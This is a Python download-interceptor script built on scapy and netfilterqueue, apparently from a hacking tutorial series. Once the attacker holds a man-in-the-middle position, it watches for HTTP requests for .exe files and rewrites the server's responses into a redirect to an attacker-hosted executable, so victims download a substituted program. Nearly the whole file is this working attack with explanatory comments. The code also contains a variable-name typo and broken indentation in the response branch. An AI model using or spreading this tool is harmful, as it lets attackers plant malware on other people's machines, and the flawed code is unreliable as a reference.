#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy


ack_list = []

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw):
		if scapy_packet[scapy.TCP].dport == 80:  # dport as destination port that means it is a request
			print("HTTP request")
			# print(scapy_packet.show())
			if ".exe" in scapy_packet[scapy.Raw].load:  # to replace the .exe file we can replace any file_extension from request
				print("[+] exe Request")
				# here if we want to modify the request we'll have to make TCP handshake 
				# solution for that is we can just modify response so there TCP handshake had already done
				ack_list.append(scapy_packet[scapy.TCP].ack)

		elif scapy_packet[scapy.TCP].sport == 80: # sport as source port that means it is a response
			print("HTTP response")
			if scapy_packet[scapy.TCP].seq in ack_list:   # to check the acknowledge and sequence of TCP layer is same
			# so that we can determine this response is same for the request made
			ack_list.remove(scapy_packetp[scapy.TCP].seq)  # so that we will remove the acknowledged number
			print("[+] Replacing file")
			scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://YourWebServerIP/PathAndNameOfFile.exe\n\n"
			  # 301 is http status code for moved permenantly which will redirect the request to given location

				del scapy_packet[scapy.IP].len
				del scapy_packet[scapy.IP].chksum  
				# as we are replacing the file this field will also be changed 
				# so we will have to delet them and scapy will calculate and fill those fields accordingly
				del scapy_packet[scapy.TCP].chksum

				packet.set_payload(str(scapy_packet)) # at first we get the payload and modify it
				# after modifying while responsing to the request we will send the modified response

	packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()







'''
Here we will be intercepting the download requests
for this ofcourse you'll need to be mitm
and you'll also need to queue the requests using iptables as we 
did in DNS spoofer program
'''